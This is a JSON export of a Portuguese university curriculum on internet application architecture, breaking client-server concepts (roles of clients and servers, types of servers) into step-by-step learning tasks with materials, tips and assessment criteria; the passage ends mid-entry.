{
  "formatVersion": "1.0",
  "exportDate": "2025-12-04T22:00:50.647Z",
  "appVersion": "1.0",
  "curriculumData": {
    "metadata": {
      "baseOn": "Catálogo dos Cursos de Graduação 2025 - SI-26",
      "lastUpdated": "2025-12-04",
      "totalAtomicSkills": 229
    },
    "areas": [
      {
        "id": "10",
        "name": "Sistemas de Informação",
        "description": "Área focada no desenvolvimento e gerenciamento de sistemas computacionais para aplicações web, móveis e em nuvem.",
        "disciplines": [
          {
            "id": "10.1",
            "name": "Desenvolvimento de Aplicações para a Internet",
            "description": "Introdução à arquitetura de aplicações para a Internet. Desenvolvimento de aplicações móveis. Desenvolvimento de serviços para a Internet. Desenvolvimento de aplicações para a Nuvem. Introdução à segurança de aplicações na Internet.",
            "mainTopics": [
              {
                "id": "10.1.1",
                "name": "Introdução à arquitetura de aplicações para a Internet",
                "description": "Apresenta os conceitos fundamentais e estruturas básicas para o desenvolvimento de aplicações destinadas à Internet.",
                "totalSkills": 46,
                "atomicTopics": [
                  {
                    "id": "10.1.1.1",
                    "name": "Modelo Cliente-Servidor",
                    "description": "Conceito fundamental de arquitetura onde o cliente envia requisições e o servidor responde com recursos.",
                    "individualConcepts": [
                      {
                        "id": "26.1.1.1.1",
                        "name": "Cliente no Modelo Cliente-Servidor",
                        "description": "O cliente é a componente que inicia as requisições, solicitando recursos ou serviços ao servidor, tipicamente representado por navegadores web, aplicativos móveis ou desktops.",
                        "specificSkills": [
                          {
                            "id": "26.1.1.1.1.1",
                            "name": "Identificar o papel do cliente",
                            "description": "Reconhecer que o cliente é responsável por enviar requisições HTTP ou outras ao servidor e processar as respostas recebidas, como carregar páginas web em um navegador.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender o conceito básico de cliente no modelo cliente-servidor",
                                  "subSteps": [
                                    "Ler a definição de modelo cliente-servidor: cliente inicia comunicação solicitando serviços ao servidor.",
                                    "Diferenciar cliente de servidor: cliente é o requisitante, servidor é o provedor.",
                                    "Visualizar diagrama simples de cliente-servidor usando ferramentas online.",
                                    "Identificar exemplos cotidianos de clientes (navegador, app mobile).",
                                    "Anotar diferenças entre cliente e servidor em um resumo pessoal."
                                  ],
                                  "verification": "Explicar verbalmente ou por escrito o que é um cliente no modelo cliente-servidor sem erros conceituais.",
                                  "estimatedTime": "15 minutos",
                                  "materials": "Diagrama cliente-servidor (imagem ou vídeo tutoriais como Khan Academy), caderno para anotações.",
                                  "tips": "Use analogias como 'cliente em restaurante pede ao garçom (servidor)'.",
                                  "learningObjective": "Definir e diferenciar cliente e servidor no contexto de redes.",
                                  "commonMistakes": "Confundir cliente com servidor ou achar que cliente só recebe dados."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Identificar responsabilidades de envio de requisições pelo cliente",
                                  "subSteps": [
                                    "Estudar protocolos como HTTP: cliente envia requisições (GET, POST).",
                                    "Simular envio de requisição usando ferramentas como Postman ou curl no terminal.",
                                    "Listar tipos de requisições comuns (GET para carregar página, POST para enviar formulário).",
                                    "Observar headers e body em uma requisição real via DevTools do navegador.",
                                    "Registrar em log o que o cliente envia para um servidor teste."
                                  ],
                                  "verification": "Executar uma requisição HTTP simples e descrever o que foi enviado.",
                                  "estimatedTime": "20 minutos",
                                  "materials": "Navegador com DevTools (F12), Postman ou curl instalado, site teste como httpbin.org.",
                                  "tips": "Abra DevTools > Network para ver requisições em tempo real.",
                                  "learningObjective": "Reconhecer que o cliente inicia comunicação enviando requisições HTTP.",
                                  "commonMistakes": "Ignorar que cliente pode enviar dados no body ou headers."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar o processamento de respostas recebidas pelo cliente",
                                  "subSteps": [
                                    "Examinar estrutura de resposta HTTP: status code (200 OK), headers, body (HTML, JSON).",
                                    "Simular recebimento de resposta em ferramenta como Postman e interpretá-la.",
                                    "Descrever como navegador processa HTML/CSS/JS para renderizar página.",
                                    "Identificar erros comuns em respostas (404 Not Found) e como cliente reage.",
                                    "Criar fluxograma do ciclo: requisição > resposta > processamento."
                                  ],
                                  "verification": "Interpretar uma resposta HTTP de exemplo e explicar seu processamento.",
                                  "estimatedTime": "20 minutos",
                                  "materials": "Postman, DevTools do navegador, exemplos de respostas HTTP online.",
                                  "tips": "Foquem em status codes: 2xx sucesso, 4xx erro cliente, 5xx erro servidor.",
                                  "learningObjective": "Entender como cliente processa e renderiza respostas do servidor.",
                                  "commonMistakes": "Achar que servidor renderiza a página; cliente faz isso."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Consolidar o papel do cliente com exemplos integrados",
                                  "subSteps": [
                                    "Assistir vídeo de fluxo cliente-servidor (ex: freeCodeCamp).",
                                    "Mapear um cenário real: carregar página web (cliente envia GET, recebe HTML, renderiza).",
                                    "Comparar cliente web vs. app mobile (ambos enviam requisições).",
                                    "Criar diagrama pessoal do papel completo do cliente.",
                                    "Testar em ambiente local com servidor simples (Node.js ou Python Flask)."
                                  ],
                                  "verification": "Desenhar e explicar diagrama completo do ciclo cliente-servidor.",
                                  "estimatedTime": "25 minutos",
                                  "materials": "Vídeos tutoriais (YouTube), ferramentas de diagrama (Draw.io), servidor local opcional.",
                                  "tips": "Teste bloqueando rede para ver como cliente reage sem resposta.",
                                  "learningObjective": "Integrar envio de requisições e processamento de respostas no papel do cliente.",
                                  "commonMistakes": "Subestimar processamento local (renderização, cache)."
                                }
                              ],
                              "practicalExample": "Ao digitar 'www.google.com' no navegador Chrome (cliente), ele envia uma requisição HTTP GET ao servidor do Google; recebe resposta com HTML, CSS e JS; processa e renderiza a página de busca na tela do usuário.",
                              "finalVerifications": [
                                "Explicar o ciclo completo: cliente envia requisição → servidor responde → cliente processa.",
                                "Identificar cliente em cenários reais (navegador, app de delivery).",
                                "Simular requisição HTTP e interpretar resposta sem erros.",
                                "Diferenciar responsabilidades: cliente inicia, servidor responde.",
                                "Criar fluxograma preciso do papel do cliente.",
                                "Reconhecer protocolos como HTTP no contexto cliente-servidor."
                              ],
                              "assessmentCriteria": [
                                "Precisão conceitual: definição correta de cliente (90% acerto).",
                                "Compreensão prática: simulação de requisição/resposta funcional.",
                                "Detalhamento: inclusão de protocolos HTTP e processamento.",
                                "Clareza na explicação: uso de exemplos cotidianos sem confusões.",
                                "Integração: ligação com modelo cliente-servidor amplo.",
                                "Criatividade: analogias ou diagramas originais eficazes."
                              ],
                              "crossCurricularConnections": [
                                "Redes de Computadores: protocolos HTTP/TCP e camadas OSI.",
                                "Programação Web: uso de fetch/AJAX em JavaScript como cliente.",
                                "Desenvolvimento de Software: APIs REST onde cliente consome endpoints.",
                                "Segurança da Informação: HTTPS e autenticação no cliente."
                              ],
                              "realWorldApplication": "Em desenvolvimento web, entender o cliente permite criar interfaces responsivas que lidam com latência de rede, caches locais e erros de servidor, como em apps de e-commerce onde o navegador carrega produtos dinamicamente via requisições AJAX."
                            },
                            "estimatedTime": "0.5 horas",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "26.1.1.1.1.2",
                            "name": "Exemplificar tipos de clientes",
                            "description": "Listar e descrever exemplos comuns de clientes, como navegadores (Chrome, Firefox), aplicativos móveis (apps Android/iOS) e clientes dedicados (APIs consumers).",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender o Conceito Básico de Cliente no Modelo Cliente-Servidor",
                                  "subSteps": [
                                    "Defina o que é um cliente no contexto do modelo cliente-servidor.",
                                    "Explique o papel do cliente: solicitar serviços ou recursos do servidor.",
                                    "Diferencie cliente de servidor, destacando a comunicação via rede (ex: HTTP).",
                                    "Identifique características comuns: interface de usuário, processamento local e comunicação assíncrona.",
                                    "Revise exemplos iniciais genéricos, como um app que acessa dados remotos."
                                  ],
                                  "verification": "Escreva uma definição curta (2-3 frases) e explique com um diagrama simples desenhado à mão ou em ferramenta digital.",
                                  "estimatedTime": "20 minutos",
                                  "materials": "Notebook ou papel para anotações, acesso à internet para diagramas básicos (ex: draw.io gratuito).",
                                  "tips": "Use analogias cotidianas, como cliente em uma loja pedindo ao caixa (servidor).",
                                  "learningObjective": "Entender o papel fundamental do cliente como iniciador de interações no modelo C-S.",
                                  "commonMistakes": "Confundir cliente com servidor ou achar que cliente processa tudo localmente sem rede."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Identificar e Descrever Clientes Web (Navegadores)",
                                  "subSteps": [
                                    "Liste navegadores comuns: Chrome, Firefox, Safari, Edge.",
                                    "Descreva como funcionam: renderizam HTML/CSS/JS, enviam requisições HTTP ao servidor.",
                                    "Explore extensões e como navegadores atuam como clientes para múltiplos serviços (ex: Google services).",
                                    "Teste acessando um site simples e inspecione as requisições no DevTools.",
                                    "Registre diferenças entre navegadores em compatibilidade."
                                  ],
                                  "verification": "Abra DevTools em um navegador, acesse um site e capture uma screenshot de uma requisição de rede.",
                                  "estimatedTime": "25 minutos",
                                  "materials": "Navegadores instalados (Chrome/Firefox), site de teste como http://httpbin.org.",
                                  "tips": "Ative o modo desenvolvedor (F12) para ver requisições reais em tempo real.",
                                  "learningObjective": "Reconhecer navegadores como clientes web padrão e suas interações com servidores.",
                                  "commonMistakes": "Ignorar que navegadores podem ser clientes para APIs REST além de páginas web."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Explorar Clientes Móveis e Dedicados",
                                  "subSteps": [
                                    "Descreva apps móveis Android/iOS: usam SDKs nativos para comunicação HTTP/WebSocket com servidores.",
                                    "Exemplifique apps como Instagram ou WhatsApp acessando backends.",
                                    "Defina clientes dedicados: ferramentas como Postman, cURL ou apps customizados consumindo APIs.",
                                    "Instale e teste Postman para simular chamadas API.",
                                    "Compare: apps móveis têm UI rica, dedicados focam em integração pura."
                                  ],
                                  "verification": "Faça uma requisição GET simples via Postman ou app móvel e anote o response.",
                                  "estimatedTime": "30 minutos",
                                  "materials": "Postman (gratuito), emulador Android/iOS ou celular real, API pública como JSONPlaceholder.",
                                  "tips": "Comece com APIs públicas para evitar autenticação complexa.",
                                  "learningObjective": "Diferenciar e exemplificar clientes móveis e dedicados em cenários reais.",
                                  "commonMistakes": "Confundir apps móveis com navegadores ou subestimar clientes dedicados como 'não UI'."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Sintetizar Exemplos e Comparar Tipos de Clientes",
                                  "subSteps": [
                                    "Crie uma tabela comparativa: colunas para tipo (web, móvel, dedicado), exemplos, protocolos, vantagens/desvantagens.",
                                    "Liste 5-7 exemplos totais distribuídos nos tipos.",
                                    "Desenvolva um cenário híbrido: app móvel usando navegador embutido e API dedicada.",
                                    "Discuta evoluções: PWAs como clientes híbridos.",
                                    "Prepare uma apresentação curta ou resumo escrito."
                                  ],
                                  "verification": "Crie e compartilhe a tabela comparativa (Google Docs ou imagem).",
                                  "estimatedTime": "25 minutos",
                                  "materials": "Ferramenta de tabela (Google Sheets, Excel), timer para síntese.",
                                  "tips": "Use ícones ou imagens para tornar a tabela visualmente atraente.",
                                  "learningObjective": "Integrar conhecimentos para exemplificar e comparar tipos de clientes coerentemente.",
                                  "commonMistakes": "Listar exemplos irrelevantes ou não conectar de volta ao modelo C-S."
                                }
                              ],
                              "practicalExample": "Imagine desenvolver um app de delivery: use Chrome para protótipo web (cliente navegador acessando mapa via API Google), app Android para usuários finais (cliente móvel consumindo pedidos do servidor), e Postman para testes de integração (cliente dedicado validando endpoints de pagamento).",
                              "finalVerifications": [
                                "Pode listar pelo menos 3 tipos de clientes com 2 exemplos cada.",
                                "Explica corretamente o fluxo de comunicação cliente-servidor em um diagrama.",
                                "Demonstra uma requisição real via navegador ou ferramenta dedicada.",
                                "Compara vantagens/desvantagens de pelo menos dois tipos.",
                                "Identifica um cenário real onde múltiplos tipos coexistem.",
                                "Cria uma tabela ou lista organizada de exemplos."
                              ],
                              "assessmentCriteria": [
                                "Precisão conceitual: definições corretas sem confusões (30%)",
                                "Completude de exemplos: variedade e relevância (25%)",
                                "Profundidade descritiva: detalhes sobre funcionamento (20%)",
                                "Demonstração prática: evidências de testes (15%)",
                                "Organização e clareza: tabelas/diagramas legíveis (10%)"
                              ],
                              "crossCurricularConnections": [
                                "Redes de Computadores: protocolos HTTP/HTTPS usados por clientes.",
                                "Desenvolvimento Mobile: construção de apps Android/iOS como clientes.",
                                "Programação Web: uso de JavaScript em navegadores para chamadas AJAX.",
                                "Design de UX/UI: interfaces de clientes impactam usabilidade."
                              ],
                              "realWorldApplication": "Ao desenvolver aplicações web, arquitetos escolhem tipos de clientes para otimizar: navegadores para acessibilidade ampla, apps móveis para notificações push, e clientes dedicados em microsserviços/IoT para eficiência em integrações backend."
                            },
                            "estimatedTime": "0.5 horas",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "26.1.1.1.1.3",
                            "name": "Diferenciar cliente de outros modelos",
                            "description": "Comparar o cliente no modelo cliente-servidor com arquiteturas peer-to-peer, destacando a assimetria onde o cliente só consome recursos.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender o papel do cliente no modelo cliente-servidor",
                                  "subSteps": [
                                    "Defina o modelo cliente-servidor: cliente inicia requisições e consome recursos do servidor.",
                                    "Identifique características do cliente: leve, focado em interface de usuário, não armazena dados principais.",
                                    "Explique a assimetria: cliente só consome, servidor fornece e gerencia recursos.",
                                    "Liste exemplos comuns: navegador web como cliente acessando um site.",
                                    "Desenhe um diagrama simples mostrando fluxo cliente -> servidor."
                                  ],
                                  "verification": "Crie um diagrama ou resumo escrito explicando o papel do cliente com assimetria destacada.",
                                  "estimatedTime": "20 minutos",
                                  "materials": "Papel e caneta ou ferramenta de diagrama online (ex: draw.io), vídeo introdutório sobre cliente-servidor (YouTube).",
                                  "tips": "Use analogia de restaurante: cliente pede, garçom (servidor) traz comida.",
                                  "learningObjective": "Entender e descrever precisamente o comportamento assimétrico do cliente.",
                                  "commonMistakes": "Confundir cliente com servidor, achando que cliente armazena dados como servidor."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Explorar a arquitetura peer-to-peer (P2P)",
                                  "subSteps": [
                                    "Defina P2P: todos os nós são iguais, atuam como cliente e servidor simultaneamente.",
                                    "Descreva simetria: peers compartilham recursos diretamente, sem hierarquia central.",
                                    "Liste exemplos: BitTorrent para compartilhamento de arquivos, blockchain como Bitcoin.",
                                    "Compare topologia: rede descentralizada vs. centralizada em cliente-servidor.",
                                    "Identifique vantagens do P2P: resiliência, escalabilidade sem ponto único de falha."
                                  ],
                                  "verification": "Escreva uma definição de P2P e liste 3 diferenças básicas de cliente-servidor.",
                                  "estimatedTime": "25 minutos",
                                  "materials": "Artigos ou vídeos sobre P2P (ex: Khan Academy ou Wikipedia), software demo como uTorrent.",
                                  "tips": "Pense em amigos compartilhando arquivos diretamente vs. via um servidor central.",
                                  "learningObjective": "Diferenciar a simetria do P2P da assimetria cliente-servidor.",
                                  "commonMistakes": "Achar que P2P é sempre ilegal (ex: só pirataria), ignorando usos legítimos."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Comparar cliente-servidor com P2P destacando assimetria",
                                  "subSteps": [
                                    "Crie uma tabela comparativa: colunas para cliente-servidor vs. P2P (funções, recursos, dependências).",
                                    "Enfatize assimetria no cliente-servidor: cliente passivo/consumidor vs. peers ativos em P2P.",
                                    "Discuta desvantagens da assimetria: dependência do servidor, ponto único de falha.",
                                    "Analise cenários: quando usar cada (ex: web apps cliente-servidor vs. file sharing P2P).",
                                    "Simule uma falha: o que acontece se servidor cai vs. peer sai da rede."
                                  ],
                                  "verification": "Preencha tabela comparativa com pelo menos 5 linhas de diferenças.",
                                  "estimatedTime": "30 minutos",
                                  "materials": "Planilha Google Sheets ou papel para tabela, exemplos reais de apps (Chrome vs. BitTorrent).",
                                  "tips": "Use setas em diagramas para mostrar fluxo unidirecional (cliente-servidor) vs. bidirecional (P2P).",
                                  "learningObjective": "Realizar comparação precisa focando na assimetria do cliente.",
                                  "commonMistakes": "Ignorar que alguns sistemas híbridos existem, generalizando demais."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Aplicar o conhecimento em exemplos práticos e sintetizar diferenças",
                                  "subSteps": [
                                    "Analise um exemplo real: navegador (cliente) vs. app de chat P2P como Tox.",
                                    "Explique por que cliente-servidor é dominante na web: simplicidade e segurança.",
                                    "Crie um fluxograma mostrando interações em ambos modelos.",
                                    "Debata prós/contras: assimetria facilita gerenciamento mas limita autonomia.",
                                    "Resuma em 3 bullet points chave as diferenças do cliente."
                                  ],
                                  "verification": "Produza fluxograma e resumo escrito explicando assimetria.",
                                  "estimatedTime": "25 minutos",
                                  "materials": "Ferramenta de fluxograma (Lucidchart free), sites como whatismyipaddress.com para testar cliente.",
                                  "tips": "Teste abrindo um site: sinta o papel passivo do seu browser.",
                                  "learningObjective": "Sintetizar diferenças e aplicar em contextos reais.",
                                  "commonMistakes": "Confundir cliente com usuário final, não com software."
                                }
                              ],
                              "practicalExample": "Ao navegar no Google com Chrome (cliente), você envia requisição ao servidor Google, que responde com página; em P2P como BitTorrent, seu app baixa de múltiplos peers e simultaneamente envia para outros.",
                              "finalVerifications": [
                                "Explicar verbalmente a assimetria do cliente em 1 minuto.",
                                "Desenhar diagrama correto cliente-servidor vs. P2P.",
                                "Identificar corretamente 3 exemplos de cada modelo.",
                                "Listar 2 vantagens/desvantagens da assimetria.",
                                "Comparar em tabela sem erros factuais.",
                                "Simular falha de servidor e impacto no cliente."
                              ],
                              "assessmentCriteria": [
                                "Precisão conceitual: definição correta de assimetria (100%).",
                                "Profundidade da comparação: pelo menos 5 diferenças claras.",
                                "Uso de exemplos relevantes e precisos.",
                                "Clareza em diagramas/fluxogramas: legíveis e precisos.",
                                "Síntese: resumo conciso destacando cliente como consumidor.",
                                "Criatividade em analogias para explicar conceitos."
                              ],
                              "crossCurricularConnections": [
                                "Redes de Computadores: topologias e protocolos (TCP/IP).",
                                "Programação: desenvolvimento de apps cliente-side (HTML/JS).",
                                "Administração: modelos de negócio centralizados vs. descentralizados.",
                                "Segurança da Informação: vulnerabilidades em clientes vs. peers."
                              ],
                              "realWorldApplication": "Em desenvolvimento web, entender isso guia escolha de arquitetura: use cliente-servidor para apps escaláveis como Netflix (cliente consome stream do servidor), evitando P2P para evitar complexidade regulatória em dados sensíveis."
                            },
                            "estimatedTime": "0.5 horas",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "26.1.1.1.2",
                        "name": "Servidor no Modelo Cliente-Servidor",
                        "description": "O servidor é a entidade que processa as requisições dos clientes, gerenciando recursos como bancos de dados, arquivos e lógica de negócio, e envia respostas apropriadas.",
                        "specificSkills": [
                          {
                            "id": "26.1.1.1.2.1",
                            "name": "Descrever funções do servidor",
                            "description": "Explicar que o servidor escuta requisições em portas específicas (ex: 80 para HTTP), autentica, processa e retorna dados como HTML, JSON ou imagens.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender o papel básico do servidor e escuta de requisições",
                                  "subSteps": [
                                    "Defina o que é um servidor no modelo cliente-servidor: um programa que espera por conexões de clientes.",
                                    "Explique o conceito de portas de rede como 'endereços lógicos' para serviços específicos.",
                                    "Liste portas comuns: 80 para HTTP, 443 para HTTPS, 8080 para testes.",
                                    "Descreva como o servidor 'escuta' (listen) na porta usando sockets TCP.",
                                    "Visualize o fluxo inicial: cliente envia SYN, servidor responde SYN-ACK."
                                  ],
                                  "verification": "Explique verbalmente ou por escrito como um servidor escuta na porta 80 e por que isso é necessário.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Diagrama TCP handshake",
                                    "Lista de portas IANA (iana.org/assignments/service-names-port-numbers)",
                                    "Ferramenta telnet ou nc para testar portas"
                                  ],
                                  "tips": "Use analogia de telefone: porta é o número do ramal que o servidor atende.",
                                  "learningObjective": "Identificar e descrever a função de escuta do servidor em portas específicas.",
                                  "commonMistakes": [
                                    "Confundir porta com endereço IP",
                                    "Achar que servidores só usam porta 80",
                                    "Ignorar diferença entre TCP e UDP"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Descrever o recebimento e autenticação de requisições",
                                  "subSteps": [
                                    "Detalhe o recebimento da requisição HTTP: método (GET/POST), headers, body.",
                                    "Explique autenticação: verificação de credenciais via Basic Auth, tokens JWT ou cookies de sessão.",
                                    "Discuta autorização: checar permissões após autenticação (ex: role-based access).",
                                    "Identifique headers comuns: User-Agent, Authorization, Content-Type.",
                                    "Simule uma requisição inválida e como o servidor responde com 401 Unauthorized."
                                  ],
                                  "verification": "Monte uma requisição HTTP simples e identifique partes de autenticação.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Documentação HTTP/1.1 RFC 2616",
                                    "Ferramenta Postman ou curl para simular requisições",
                                    "Exemplos de headers em Wireshark"
                                  ],
                                  "tips": "Sempre cheque autenticação ANTES de processar para evitar ataques.",
                                  "learningObjective": "Explicar como o servidor autentica requisições recebidas.",
                                  "commonMistakes": [
                                    "Confundir autenticação com autorização",
                                    "Ignorar headers de segurança como CORS",
                                    "Pensar que todas requisições precisam de login"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Explicar o processamento da requisição",
                                  "subSteps": [
                                    "Descreva parsing da requisição: extrair URL, query params, body.",
                                    "Explique roteamento: mapear URL para handlers/funções específicas.",
                                    "Detalhe processamento lógico: consultar BD, executar lógica de negócio, gerar dados.",
                                    "Mencione middlewares: logging, validação, caching durante processamento.",
                                    "Considere erros: retornar 404 para rota inexistente, 500 para falhas internas."
                                  ],
                                  "verification": "Desenhe um fluxograma do processamento de uma requisição GET /users.",
                                  "estimatedTime": "35 minutos",
                                  "materials": [
                                    "Exemplo de código Node.js/Express router",
                                    "Diagrama de fluxo de processamento",
                                    "Ferramenta como Node.js ou Python Flask para testar"
                                  ],
                                  "tips": "Separe concerns: roteamento > autenticação > business logic.",
                                  "learningObjective": "Detalhar as etapas internas de processamento no servidor.",
                                  "commonMistakes": [
                                    "Pular validação de inputs levando a injeções SQL",
                                    "Processar sem roteamento causando erros",
                                    "Ignorar performance com loops infinitos"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Detalhar a geração e retorno de respostas",
                                  "subSteps": [
                                    "Descreva formatos de resposta: HTML, JSON, XML, imagens/binários.",
                                    "Explique headers de resposta: Content-Type, Content-Length, Status Code.",
                                    "Monte a resposta: status (200 OK, 404 Not Found), body serializado.",
                                    "Feche a conexão ou mantenha alive para HTTP/1.1 persistent.",
                                    "Teste resposta com ferramentas para validar formato e status."
                                  ],
                                  "verification": "Crie uma resposta HTTP manual para uma requisição e valide com browser dev tools.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Documentação status codes HTTP",
                                    "Browser DevTools Network tab",
                                    "Exemplo curl -v para ver respostas"
                                  ],
                                  "tips": "Sempre defina Content-Type correto para evitar erros de renderização.",
                                  "learningObjective": "Compreender como o servidor formata e envia dados de volta ao cliente.",
                                  "commonMistakes": [
                                    "Retornar JSON sem header application/json",
                                    "Esquecer status codes apropriados",
                                    "Enviar dados grandes sem compressão"
                                  ]
                                }
                              ],
                              "practicalExample": "Configure um servidor Node.js simples com Express: app.listen(3000); app.get('/api/users', autenticaUsuario, processaQueryBD, (req,res) => res.json(users)). Ao acessar localhost:3000/api/users sem token, retorna 401; com token válido, processa e retorna JSON de usuários.",
                              "finalVerifications": [
                                "Liste e explique 4 funções principais do servidor (escuta, autentica, processa, responde).",
                                "Descreva o fluxo completo de uma requisição HTTP do início ao fim.",
                                "Identifique portas padrão para HTTP e HTTPS e seu propósito.",
                                "Simule uma resposta de erro 404 e explique por quê.",
                                "Explique diferença entre autenticação e processamento em um exemplo real.",
                                "Valide uma requisição com curl e interprete a resposta."
                              ],
                              "assessmentCriteria": [
                                "Precisão técnica: uso correto de termos como portas, headers, status codes.",
                                "Completude: cobertura de todas funções (escuta, autenticação, processamento, resposta).",
                                "Clareza na explicação: uso de analogias e fluxogramas.",
                                "Exemplos práticos: inclusão de cenários reais como APIs REST.",
                                "Correção de erros comuns: distinção entre conceitos confundíveis.",
                                "Profundidade: menção a headers, formatos e segurança."
                              ],
                              "crossCurricularConnections": [
                                "Redes de Computadores: protocolos TCP/IP e handshake de conexão.",
                                "Segurança da Informação: mecanismos de autenticação e prevenção de ataques.",
                                "Programação: implementação de servidores em linguagens como Node.js ou Python.",
                                "Banco de Dados: processamento de queries durante a lógica de negócio.",
                                "Desenvolvimento Web: integração com front-end via JSON APIs."
                              ],
                              "realWorldApplication": "Em e-commerces como Amazon, o servidor escuta na porta 443 (HTTPS), autentica via JWT, processa carrinho de compras consultando BD e retorna JSON atualizado para atualização dinâmica da página sem reload."
                            },
                            "estimatedTime": "0.5 horas",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "26.1.1.1.2.2",
                            "name": "Identificar tipos de servidores",
                            "description": "Classificar servidores web (Apache, Nginx), de aplicação (Node.js, Tomcat) e de banco de dados (MySQL), e seu papel no ecossistema cliente-servidor.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender o Conceito Básico do Modelo Cliente-Servidor",
                                  "subSteps": [
                                    "Defina o que é um cliente no contexto de aplicações web (ex: navegador ou app móvel).",
                                    "Defina o que é um servidor e suas funções principais (processar requisições, fornecer recursos).",
                                    "Explique o fluxo de comunicação: requisição HTTP do cliente, resposta do servidor.",
                                    "Identifique exemplos reais de clientes e servidores cotidianos."
                                  ],
                                  "verification": "Resuma em uma frase o papel do servidor no ecossistema cliente-servidor.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Documentação MDN Web Docs sobre HTTP",
                                    "Vídeo introdutório no YouTube sobre cliente-servidor"
                                  ],
                                  "tips": "Use diagramas simples para visualizar o fluxo cliente-servidor.",
                                  "learningObjective": "Entender a interação fundamental entre cliente e servidor.",
                                  "commonMistakes": "Confundir cliente com servidor ou ignorar o protocolo HTTP."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Identificar e Classificar Servidores Web",
                                  "subSteps": [
                                    "Descreva o que é um servidor web e seus exemplos principais (Apache e Nginx).",
                                    "Compare Apache (modular, .htaccess) vs Nginx (event-driven, alta performance).",
                                    "Liste cenários de uso: Apache para sites dinâmicos, Nginx para load balancing.",
                                    "Instale e execute uma instância local simples de Nginx ou Apache via Docker."
                                  ],
                                  "verification": "Classifique corretamente Apache e Nginx como servidores web com suas diferenças chave.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Site oficial Apache HTTP Server",
                                    "Documentação Nginx",
                                    "Docker para instalação rápida"
                                  ],
                                  "tips": "Teste acessando localhost após instalação para ver em ação.",
                                  "learningObjective": "Diferenciar servidores web por características e usos.",
                                  "commonMistakes": "Achar que todos os servidores web são iguais, ignorando diferenças de performance."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Explorar Servidores de Aplicação",
                                  "subSteps": [
                                    "Defina servidor de aplicação e exemplos (Node.js runtime, Tomcat para Java).",
                                    "Explique o papel: executar lógica de negócios, processar dados da app.",
                                    "Compare Node.js (JavaScript assíncrono) vs Tomcat (servlets Java).",
                                    "Crie um script simples Node.js que responda a uma requisição HTTP."
                                  ],
                                  "verification": "Descreva o fluxo de uma requisição passando de web server para app server.",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "Node.js oficial docs",
                                    "Apache Tomcat download",
                                    "Editor de código como VS Code"
                                  ],
                                  "tips": "Use 'node server.js' para rodar e testar com curl ou browser.",
                                  "learningObjective": "Reconhecer o papel intermediário dos servidores de aplicação.",
                                  "commonMistakes": "Confundir servidor web com servidor de app, achando que Nginx roda lógica de app."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Analisar Servidores de Banco de Dados",
                                  "subSteps": [
                                    "Defina servidor de BD e exemplo (MySQL como RDBMS).",
                                    "Explique funções: armazenar, consultar e gerenciar dados persistentes.",
                                    "Descreva integração: app server consulta MySQL via SQL.",
                                    "Instale MySQL localmente e execute uma query básica via CLI."
                                  ],
                                  "verification": "Explique como MySQL se integra ao ecossistema cliente-servidor.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "MySQL oficial download e docs",
                                    "MySQL Workbench para interface gráfica"
                                  ],
                                  "tips": "Use 'mysql -u root -p' para conectar e testar SELECT * FROM users;",
                                  "learningObjective": "Identificar servidores de BD e seu papel de persistência de dados.",
                                  "commonMistakes": "Pensar que BD servers lidam diretamente com requisições HTTP do cliente."
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Classificar e Integrar Todos os Tipos de Servidores",
                                  "subSteps": [
                                    "Crie uma tabela comparativa: Web (Apache/Nginx), App (Node/Tomcat), BD (MySQL).",
                                    "Desenhe um diagrama do ecossistema completo com setas de fluxo.",
                                    "Simule um cenário: cliente -> Nginx -> Node.js -> MySQL.",
                                    "Discuta escolhas baseadas em escala e performance."
                                  ],
                                  "verification": "Classifique corretamente os três tipos e descreva um fluxo integrado.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Ferramenta de diagrama como Draw.io",
                                    "Papel e caneta para esboço manual"
                                  ],
                                  "tips": "Pense em stacks reais como LAMP (Linux, Apache, MySQL, PHP).",
                                  "learningObjective": "Sintetizar conhecimentos para classificação holística.",
                                  "commonMistakes": "Isolar tipos sem ver a interdependência no ecossistema."
                                }
                              ],
                              "practicalExample": "Em um e-commerce como Amazon, o browser (cliente) envia pedido para Nginx (web server), que roteia para Node.js (app server) processando carrinho, consultando MySQL (DB server) para estoque e preços.",
                              "finalVerifications": [
